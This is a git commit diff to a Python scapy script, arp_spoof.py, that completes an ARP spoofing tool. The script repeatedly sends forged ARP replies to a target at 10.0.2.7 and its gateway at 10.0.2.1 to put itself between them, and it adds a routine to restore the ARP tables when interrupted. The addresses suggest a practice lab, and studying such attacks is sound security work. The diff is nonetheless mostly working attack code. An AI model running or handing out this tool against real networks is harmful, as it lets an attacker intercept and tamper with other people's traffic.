735279195f3619f3430a86285237dbec1bfc80a2
robert.lo <robert.lo@amtran.com.tw>
2018-12-24 01:48:54 +0800

    [import] - To finish the ARP spoof functions

--- ArpSpoof/arp_spoof.py
+++ ArpSpoof/arp_spoof.py
@@ -2,6 +2,7 @@
 
 import scapy.all as scapy
 import time
+import sys
 
 def toList_scapy_field_info(object_):
     scapy.ls(object_)
@@ -17,10 +18,29 @@ def spoof(target_ip, spoof_ip):
     # op=2 ARP response, pdst : target machine IP
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    print(packet.show())
-    print(packet.summary())
-    scapy.send(packet)
+    # print(packet.show())
+    # print(packet.summary())
+    scapy.send(packet, verbose=False)
 
-while True:
-    spoof("10.0.2.7", "10.0.2.1")
-    spoof("10.0.2.1", "10.0.2.7")
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip,hwsrc=source_mac)
+    scapy.send(packet, count = 4, verbose=False)
+
+
+target_ip = "10.0.2.7"
+gateway_ip = "10.0.2.1"
+send_packet_counts = 0
+try:
+    while True:
+        spoof(target_ip, gateway_ip)
+        spoof(gateway_ip, target_ip)
+        send_packet_counts = send_packet_counts + 2
+        print("\r[+] packets sent: " + str(send_packet_counts), end="   ")
+        # sys.stdout.flush()
+        time.sleep(2)
+except  KeyboardInterrupt:
+    print("[+] Detected Ctrl + C .... Resetting ARP table ... Please wait")
+    restore(target_ip,gateway_ip)
+    restore(gateway_ip,target_ip)
